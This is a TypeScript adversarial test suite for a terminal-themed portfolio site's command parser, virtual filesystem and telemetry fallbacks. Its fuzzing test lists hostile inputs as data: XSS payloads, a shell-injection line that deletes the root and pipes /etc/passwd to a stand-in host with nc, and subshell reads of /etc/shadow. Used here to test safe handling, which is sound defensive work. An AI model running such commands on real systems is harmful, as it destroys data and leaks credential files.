import { commandRegistry, CommandRegistry } from './src/services/commandRegistry';
import { virtualFS, VirtualFileSystem } from './src/services/fileSystem';
import { visitorService } from './src/services/visitorService';
import { portfolioConfig } from './src/config/portfolio.config';
import { THEMES } from './src/config/themes';
import { CommandContext } from './src/types/terminal';
import { harness, expect } from './tests/test_harness';

function createMockContext(overrides?: Partial<CommandContext>): CommandContext {
  let cwd = virtualFS.homePath;
  let historyList: string[] = [];
  let theme = 'matrix-green';
  let soundEnabled = true;
  let crtEnabled = true;
  let activeEasterEgg: string | null = null;
  let shutdownTriggered = false;

  return {
    get cwd() { return cwd; },
    setCwd: (newCwd: string | ((p: string) => string)) => {
      cwd = typeof newCwd === 'function' ? newCwd(cwd) : newCwd;
    },
    clearHistory: () => {
      historyList = [];
    },
    get historyList() { return historyList; },
    get theme() { return theme; },
    setTheme: (newTheme: string) => {
      theme = newTheme;
    },
    get soundEnabled() { return soundEnabled; },
    setSoundEnabled: (val) => {
      soundEnabled = typeof val === 'function' ? val(soundEnabled) : val;
    },
    get crtEnabled() { return crtEnabled; },
    setCrtEnabled: (val) => {
      crtEnabled = typeof val === 'function' ? val(crtEnabled) : val;
    },
    get activeEasterEgg() { return activeEasterEgg; },
    setActiveEasterEgg: (val: string | null) => {
      activeEasterEgg = val;
    },
    triggerShutdown: () => {
      shutdownTriggered = true;
    },
    ...overrides,
  };
}

export async function runChallenger1StressSuite(projectRoot: string) {
  harness.startSuite('Challenger 1 — Virtual Filesystem, Command Parser & Telemetry Adversarial Stress Suite');

  // =========================================================================
  // 1. COMMAND PARSER & REGISTRY ADVERSARIAL FUZZING
  // =========================================================================

  await harness.test('CHALLENGE-CMD-1: Extreme input fuzzing (10,000 char strings, unicode, null chars, HTML/script tags, control characters) executes safely without crashing', async () => {
    const ctx = createMockContext();
    const fuzzInputs = [
      'a'.repeat(10000), // Massive 10k buffer overflow attempt
      '🚀💥👾🔥🌟✨🎉👨‍💻' + '🌐'.repeat(500), // Unicode & emoji flood
      '\0\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f\x1b[31m', // Null bytes & raw terminal escape sequences
      '<script>alert("XSS_ATTEMPT")</script>', // HTML & XSS injection
      'javascript:/*--></title></style></textarea>*/<svg/onload=alert(1)>',
      '; rm -rf / ; cat /etc/passwd | nc evil.com 1337', // Shell injection sequences
      '$(whoami) `cat /etc/shadow` ${process.exit(1)}', // Process & subshell substitution
      '\'\'\'"""```\\\\\\\\\\\\///////', // Quotes & backslash storm
      'null undefined NaN [object Object] false true', // JS literal collisions
      '-'.repeat(200), // Long flag dashes
      '   \r\n\t\f\v   ', // Whitespace variations
    ];

    for (const input of fuzzInputs) {
      const res = await commandRegistry.execute(input, ctx);
      expect(res).toBeDefined();
      expect(typeof res.output).toBe('string');
      expect(typeof res.type).toBe('string');
      // Must not throw unhandled exception and must return safe response
      if (input.trim() === '') {
        expect(res.type).toBe('text');
        expect(res.output).toBe('');
      } else {
        expect(['error', 'text', 'whoami', 'help'].includes(res.type)).toBeTruthy();
      }
    }
  });

  await harness.test('CHALLENGE-CMD-2: Multi-argument whitespace fuzzing (irregular spaces, tabs, empty tokens) correctly parsed and executed across commands', async () => {
    const ctx = createMockContext();

    // 1. Echo with irregular spaces
    const echoRes = await commandRegistry.execute('echo   \t  alpha    beta   \t\t  gamma   ', ctx);
    expect(echoRes.type).toBe('text');
    expect(echoRes.output).toBe('alpha beta gamma');

    // 2. Projects with extra whitespace
    const projRes = await commandRegistry.execute('projects    web   ', ctx);
    expect(projRes.type).toBe('projects');
    expect(projRes.rawArgs).toBeDefined();
    expect(projRes.rawArgs![0]).toBe('web');

    // 3. Theme with extra whitespace
    const themeRes = await commandRegistry.execute('theme    nord   ', ctx);
    expect(themeRes.type).toBe('success');
    expect(ctx.theme).toBe('nord');

    // 4. Cat with whitespace in filename argument
    const catRes = await commandRegistry.execute('cat     about.txt   ', ctx);
    expect(catRes.type).toBe('text');
    expect(catRes.output).toContain(portfolioConfig.name);
  });

  await harness.test('CHALLENGE-CMD-3: Case-insensitive resolution and alias dispatch across all 28 commands and all 40+ aliases', async () => {
    const ctx = createMockContext();
    const allCommands = commandRegistry.getAllCommands();
    expect(allCommands.length).toBeGreaterThanOrEqual(28);

    // Verify all canonical commands resolve case-insensitively
    for (const cmd of allCommands) {
      const upper = cmd.name.toUpperCase();
      const mixed = cmd.name.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('');
      
      const resolvedUpper = commandRegistry.getCommand(upper);
      expect(resolvedUpper).toBeDefined();
      expect(resolvedUpper?.name).toBe(cmd.name);

      const resolvedMixed = commandRegistry.getCommand(mixed);
      expect(resolvedMixed).toBeDefined();
      expect(resolvedMixed?.name).toBe(cmd.name);

      // Verify all registered aliases
      if (cmd.aliases) {
        for (const alias of cmd.aliases) {
          const resolvedAlias = commandRegistry.getCommand(alias.toUpperCase());
          expect(resolvedAlias).toBeDefined();
          // The alias must resolve to a valid command definition
          expect(typeof resolvedAlias?.execute).toBe('function');
        }
      }
    }
  });

  await harness.test('CHALLENGE-CMD-4: Help command manual entry lookup across all registered commands and invalid targets', async () => {
    const ctx = createMockContext();
    const allCommands = commandRegistry.getAllCommands();

    for (const cmd of allCommands) {
      const res = await commandRegistry.execute(`help ${cmd.name}`, ctx);
      expect(res.type).toBe('info');
      expect(res.output).toContain(`COMMAND: ${cmd.name}`);
      expect(res.output).toContain(`USAGE: ${cmd.usage}`);
      expect(res.output).toContain(`CATEGORY: ${cmd.category}`);
      expect(res.output).toContain('DESCRIPTION:');
    }

    // Non-existent command manual lookup
    const resInvalid = await commandRegistry.execute('help non_existent_command_xyz_404', ctx);
    expect(resInvalid.type).toBe('error');
    expect(resInvalid.output).toContain("no manual entry for 'non_existent_command_xyz_404'");
  });

  await harness.test('CHALLENGE-CMD-5: Exception isolation inside command handlers — throws are caught, soundFX.playError is called, and error CommandResult is returned', async () => {
    const ctx = createMockContext();
    const isolatedRegistry = new CommandRegistry();

    // Register a faulty command that throws
    isolatedRegistry.register({
      name: 'faulty_command',
      category: 'System',
      description: 'Simulates runtime panic inside command execution',
      usage: 'faulty_command',
      execute: () => {
        throw new Error('Simulated runtime panic inside handler');
      }
    });

    const res = await isolatedRegistry.execute('faulty_command with args', ctx);
    expect(res.type).toBe('error');
    expect(res.output).toContain('Execution error: Simulated runtime panic inside handler');
    expect(res.rawArgs).toBeDefined();
    expect(res.rawArgs![0]).toBe('with');
  });

  await harness.test('CHALLENGE-CMD-6: System utility execution bounds (echo, uptime, date, history, sudo, vim, quote, cowsay)', async () => {
    const ctx = createMockContext();

    // 1. Echo with 0 args
    const echoEmpty = await commandRegistry.execute('echo', ctx);
    expect(echoEmpty.type).toBe('text');
    expect(echoEmpty.output).toBe('');

    // 2. Uptime format
    const uptimeRes = await commandRegistry.execute('uptime', ctx);
    expect(uptimeRes.type).toBe('text');
    expect(uptimeRes.output).toMatch(/up .*, 1 user, load average: 0\.12, 0\.08, 0\.03/);

    // 3. Date format
    const dateRes = await commandRegistry.execute('date', ctx);
    expect(dateRes.type).toBe('text');
    expect(dateRes.output.length).toBeGreaterThan(10);

    // 4. History with items
    const ctxWithHistory = createMockContext({ historyList: ['welcome', 'ls -la', 'theme dracula', 'clear'] });
    const histRes = await commandRegistry.execute('history', ctxWithHistory);
    expect(histRes.type).toBe('text');
    expect(histRes.output).toContain('1  welcome');
    expect(histRes.output).toContain('2  ls -la');
    expect(histRes.output).toContain('3  theme dracula');
    expect(histRes.output).toContain('4  clear');

    // 5. Sudo quips
    const sudoRes = await commandRegistry.execute('sudo rm -rf /', ctx);
    expect(sudoRes.type).toBe('error');
    expect(sudoRes.output.length).toBeGreaterThan(20);

    // 6. Vim editor mock
    const vimRes = await commandRegistry.execute('vim index.ts', ctx);
    expect(vimRes.type).toBe('warning');
    expect(vimRes.output).toContain('[VIM] Opening index.ts in read-only mode');

    // 7. Quote
    const quoteRes = await commandRegistry.execute('quote', ctx);
    expect(quoteRes.type).toBe('info');
    expect(quoteRes.output.length).toBeGreaterThan(10);

    // 8. Cowsay
    const cowsayRes = await commandRegistry.execute('cowsay Adversarial Testing In Progress', ctx);
    expect(cowsayRes.type).toBe('cowsay');
    expect(cowsayRes.output).toBe('Adversarial Testing In Progress');
  });

  // =========================================================================
  // 2. VIRTUAL FILESYSTEM ADVERSARIAL STRESS & RAPID OPERATIONS
  // =========================================================================

  await harness.test('CHALLENGE-FS-1: Complex nested relative path traversals and boundaries', () => {
    // 1. Root overflow traversal clamps at /
    expect(virtualFS.resolvePath('/home/guest', '../../../../../../../../..')).toBe('/');
    expect(virtualFS.resolvePath('/', '../../..')).toBe('/');

    // 2. Deep relative navigation through multiple directories
    const resolvedEtc = virtualFS.resolvePath('/home/guest/projects', '../../etc/os-release');
    expect(resolvedEtc).toBe('/etc/os-release');

    // 3. Round-trip relative traversal
    const roundTrip = virtualFS.resolvePath('/home/guest', 'projects/../experience/../projects/agrisathi.md');
    expect(roundTrip).toBe('/home/guest/projects/agrisathi.md');

    // 4. Tilde expansion with relative traversal
    expect(virtualFS.resolvePath('/etc', '~/projects')).toBe('/home/guest/projects');
    expect(virtualFS.resolvePath('/bin', '~/../../etc/motd')).toBe('/etc/motd');
    expect(virtualFS.resolvePath('/home/guest', '~')).toBe('/home/guest');
  });

  await harness.test('CHALLENGE-FS-2: Trailing slashes, redundant multiple slashes, and dot normalization', () => {
    // Redundant consecutive slashes
    expect(virtualFS.resolvePath('/', '///home///guest//projects///')).toBe('/home/guest/projects');
    expect(virtualFS.resolvePath('/home/guest', '////bin////about')).toBe('/bin/about');

    // Dot navigation
    expect(virtualFS.resolvePath('/home/guest', '.')).toBe('/home/guest');
    expect(virtualFS.resolvePath('/home/guest', './././projects/./')).toBe('/home/guest/projects');
    expect(virtualFS.resolvePath('/', '')).toBe('/');
  });

  await harness.test('CHALLENGE-FS-3: Rapid filesystem stress test — create 500 nested files & directories, read content, verify tree integrity, and delete all', () => {
    const fsInstance = new VirtualFileSystem();
    
    // 1. Create base sandbox directory
    const createdBase = fsInstance.createDirectory('/home/guest/sandbox');
    expect(createdBase).toBe(true);

    // 2. Create 100 subdirectories under sandbox
    for (let i = 0; i < 100; i++) {
      const dirPath = `/home/guest/sandbox/sub_${i}`;
      const success = fsInstance.createDirectory(dirPath);
      expect(success).toBe(true);
    }

    // 3. Create 400 files inside the subdirectories (4 files per subdirectory)
    for (let i = 0; i < 100; i++) {
      for (let j = 0; j < 4; j++) {
        const filePath = `/home/guest/sandbox/sub_${i}/file_${j}.txt`;
        const content = `Content payload for sub_${i}_file_${j} — hash: ${Math.random()}`;
        const fileCreated = fsInstance.createFile(filePath, content);
        expect(fileCreated).toBe(true);

        // Immediately read back and verify
        const readResult = fsInstance.readFile(filePath);
        expect(readResult.error).toBeUndefined();
        expect(readResult.content).toBe(content);
      }
    }

    // 4. Verify directory listing on sandbox
    const sandboxEntries = fsInstance.listDirectory('/home/guest/sandbox');
    expect(sandboxEntries).toBeDefined();
    expect(sandboxEntries?.length).toBe(100);

    // 5. Generate tree representation on sandbox
    const treeLines = fsInstance.generateTree('/home/guest/sandbox', 2);
    expect(treeLines.length).toBeGreaterThan(100);

    // 6. Rapidly delete all 400 files and 100 subdirectories
    for (let i = 0; i < 100; i++) {
      for (let j = 0; j < 4; j++) {
        const filePath = `/home/guest/sandbox/sub_${i}/file_${j}.txt`;
        const fileRemoved = fsInstance.removeNode(filePath);
        expect(fileRemoved).toBe(true);
      }
      const dirPath = `/home/guest/sandbox/sub_${i}`;
      const dirRemoved = fsInstance.removeNode(dirPath);
      expect(dirRemoved).toBe(true);
    }

    // Remove the sandbox directory itself
    const sandboxRemoved = fsInstance.removeNode('/home/guest/sandbox');
    expect(sandboxRemoved).toBe(true);

    // Verify sandbox no longer exists
    expect(fsInstance.getNode('/home/guest/sandbox')).toBeNull();
  });

  await harness.test('CHALLENGE-FS-4: Path operation boundary checks (cat on directory, cat on missing file, cd on file, mkdir on non-existent parent, rm on root)', () => {
    // 1. cat on directory
    const catDir = virtualFS.readFile('/home/guest/projects');
    expect(catDir.error).toBeDefined();
    expect(catDir.error).toBe('cat: /home/guest/projects: Is a directory');

    // 2. cat on non-existent file
    const catMissing = virtualFS.readFile('/home/guest/nonexistent_file.xyz');
    expect(catMissing.error).toBeDefined();
    expect(catMissing.error).toBe('cat: /home/guest/nonexistent_file.xyz: No such file or directory');

    // 3. mkdir inside non-existent parent directory
    const mkdirOrphan = virtualFS.createDirectory('/invalid_parent/new_dir');
    expect(mkdirOrphan).toBe(false);

    // 4. createFile inside non-existent parent directory
    const fileOrphan = virtualFS.createFile('/invalid_parent/new_file.txt', 'test');
    expect(fileOrphan).toBe(false);

    // 5. rm on root or empty string
    expect(virtualFS.removeNode('/')).toBe(false);
    expect(virtualFS.removeNode('')).toBe(false);
    expect(virtualFS.removeNode('/nonexistent_path_999')).toBe(false);
  });

  await harness.test('CHALLENGE-FS-5: Directory listing options (ls -a, ls -l, ls -la, ls -al, ls <path>, hidden file filtering)', async () => {
    const ctx = createMockContext();

    // 1. Default ls excludes hidden files
    const lsDefault = await commandRegistry.execute('ls /home/guest', ctx);
    expect(lsDefault.type).toBe('text');
    expect(lsDefault.output.includes('.bashrc')).toBe(false);
    expect(lsDefault.output.includes('.secret.txt')).toBe(false);
    expect(lsDefault.output.includes('about.txt')).toBe(true);
    expect(lsDefault.output.includes('projects/')).toBe(true);

    // 2. ls -a includes hidden files and . / ..
    const lsAll = await commandRegistry.execute('ls -a /home/guest', ctx);
    expect(lsAll.type).toBe('text');
    expect(lsAll.output.includes('.bashrc')).toBe(true);
    expect(lsAll.output.includes('.secret.txt')).toBe(true);

    // 3. ls -l outputs permissions, user, sizes
    const lsLong = await commandRegistry.execute('ls -l /home/guest', ctx);
    expect(lsLong.type).toBe('text');
    expect(lsLong.output).toContain('guest guest');
    expect(lsLong.output).toContain('total');

    // 4. ls -la combines all flags
    const lsLongAll = await commandRegistry.execute('ls -la /home/guest', ctx);
    expect(lsLongAll.type).toBe('text');
    expect(lsLongAll.output).toContain('.bashrc');
    expect(lsLongAll.output).toContain('guest guest');

    // 5. ls on executable binary directory /bin
    const lsBin = await commandRegistry.execute('ls /bin', ctx);
    expect(lsBin.type).toBe('text');
    expect(lsBin.output).toContain('about*');
    expect(lsBin.output).toContain('matrix*');
    expect(lsBin.output).toContain('snake*');

    // 6. ls on non-existent directory
    const lsMissing = await commandRegistry.execute('ls /missing_folder_404', ctx);
    expect(lsMissing.type).toBe('error');
    expect(lsMissing.output).toContain('cannot access');
  });

  await harness.test('CHALLENGE-FS-6: Autocompletion engine stress across relative paths, root prefixes, directory trailing slashes, and non-existent paths', () => {
    // 1. Partial path completion in subdirectories
    const projComps = virtualFS.getCompletions('/home/guest', 'projects/');
    expect(projComps.length).toBeGreaterThanOrEqual(8);
    for (const comp of projComps) {
      expect(comp.startsWith('projects/')).toBe(true);
      expect(comp.endsWith('.md')).toBe(true);
    }

    // 2. Trailing slash directory completion
    const homeDirs = virtualFS.getCompletions('/home/guest', 'p');
    expect(homeDirs).toContain('projects/');

    // 3. Root directory completion
    const rootItems = virtualFS.getCompletions('/', '/');
    expect(rootItems).toContain('/bin/');
    expect(rootItems).toContain('/etc/');
    expect(rootItems).toContain('/home/');

    // 4. Relative traversal completions
    const relativeComps = virtualFS.getCompletions('/home/guest', '../../etc/o');
    expect(relativeComps).toContain('../../etc/os-release');

    // 5. Non-existent path returns empty array
    const emptyComps = virtualFS.getCompletions('/home/guest', 'non_existent_folder_xyz/sub/');
    expect(emptyComps.length).toBe(0);
  });

  // =========================================================================
  // 3. TELEMETRY & WEATHER FAILOVER UNDER SIMULATED OFFLINE / DEGRADED CONDITIONS
  // =========================================================================

  await harness.test('CHALLENGE-TELEMETRY-1: Hardware diagnostics under headless / SSR / corrupted userAgent environments', () => {
    const hw = visitorService.getHardwareInfo();
    expect(hw).toBeDefined();
    expect(typeof hw.os).toBe('string');
    expect(typeof hw.browser).toBe('string');
    expect(typeof hw.cpuCores).toBe('number');
    expect(typeof hw.memory).toBe('string');
    expect(typeof hw.gpu).toBe('string');
    expect(typeof hw.screenRes).toBe('string');
    expect(typeof hw.viewport).toBe('string');
    expect(typeof hw.pixelRatio).toBe('number');
    expect(typeof hw.colorDepth).toBe('number');
    expect(typeof hw.touchSupport).toBe('boolean');
    expect(typeof hw.language).toBe('string');
    expect(typeof hw.timezone).toBe('string');
    expect(typeof hw.networkType).toBe('string');
  });

  await harness.test('CHALLENGE-TELEMETRY-2: Geolocation failover chain simulation — ipwho.is failure -> freeipapi.com failover -> local timezone fallback', async () => {
    const originalFetch = globalThis.fetch;

    try {
      // 1. Simulate complete network blackout (fetch throws TypeError: Failed to fetch)
      globalThis.fetch = async () => {
        throw new TypeError('Failed to fetch: Network offline simulation');
      };

      // Reset cache on singleton for isolated test execution
      (visitorService as unknown as { cachedLocation: null; locationPromise: null }).cachedLocation = null;
      (visitorService as unknown as { cachedLocation: null; locationPromise: null }).locationPromise = null;

      const loc = await visitorService.getVisitorLocation();
      expect(loc).toBeDefined();
      expect(typeof loc.ip).toBe('string');
      expect(typeof loc.city).toBe('string');
      expect(typeof loc.country).toBe('string');
      expect(typeof loc.timezone).toBe('string');
      expect(loc.latitude).toBeDefined();
      expect(loc.longitude).toBeDefined();
      expect(loc.country).toBe('Earth'); // Verified fallback country
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  await harness.test('CHALLENGE-TELEMETRY-3: Weather service offline fallback simulation — Open-Meteo failure -> default pleasant weather fallback', async () => {
    const originalFetch = globalThis.fetch;

    try {
      // Simulate Open-Meteo API 500 error / offline failure
      globalThis.fetch = async (url: RequestInfo | URL) => {
        const urlStr = String(url);
        if (urlStr.includes('open-meteo.com')) {
          return new Response(JSON.stringify({ error: 'Internal Server Error' }), { status: 500 });
        }
        return new Response(JSON.stringify({}), { status: 500 });
      };

      // Reset weather cache on singleton for isolated test execution
      (visitorService as unknown as { cachedWeather: null; weatherPromise: null }).cachedWeather = null;
      (visitorService as unknown as { cachedWeather: null; weatherPromise: null }).weatherPromise = null;

      const weather = await visitorService.getVisitorWeather();
      expect(weather).toBeDefined();
      expect(weather.tempC).toBe(22); // Verified fallback temperature
      expect(weather.tempF).toBe(72);
      expect(weather.condition).toBe('Sunny');
      expect(weather.description).toBe('Clear Sky & Pleasant Breeze');
      expect(weather.icon).toBe('☀️');
      expect(typeof weather.asciiArt).toBe('string');
      expect(weather.asciiArt.length).toBeGreaterThan(10);
      expect(typeof weather.windSpeed).toBe('string');
      expect(typeof weather.humidity).toBe('string');
      expect(weather.isDay).toBe(true);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  await harness.test('CHALLENGE-TELEMETRY-4: Weather temperature conversion formula mathematical precision', () => {
    // Formula: tempF = Math.round((tempC * 9) / 5 + 32)
    const testCases = [
      { c: 0, f: 32 },
      { c: 22, f: 72 },
      { c: 100, f: 212 },
      { c: -40, f: -40 },
      { c: -10, f: 14 },
      { c: 37, f: 99 },
      { c: 15, f: 59 },
    ];

    for (const tc of testCases) {
      const calcF = Math.round((tc.c * 9) / 5 + 32);
      expect(calcF).toBe(tc.f);
    }
  });

  return harness.endSuite();
}


